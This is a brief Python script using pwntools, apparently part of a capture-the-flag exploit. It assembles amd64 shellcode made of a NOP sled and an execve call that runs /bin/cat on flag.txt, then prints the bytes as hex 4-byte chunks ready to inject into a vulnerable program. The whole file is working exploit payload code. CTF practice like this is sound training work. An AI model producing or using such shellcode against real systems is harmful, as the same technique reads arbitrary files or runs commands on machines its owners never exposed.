from pwn import *

context.arch = "amd64"

shellcode = asm("nop; nop; nop; nop")
shellcode += asm(shellcraft.execve(path="/bin/cat", argv=["/bin/cat", "flag.txt"]))
                             
final = []
for i in range(0, len(shellcode), 4):
    final.append("0x" + shellcode[i:(i+4)].hex())
print("[", end="")
for i in final:
    print(i, end=",")
print("]")

# r.interactive()
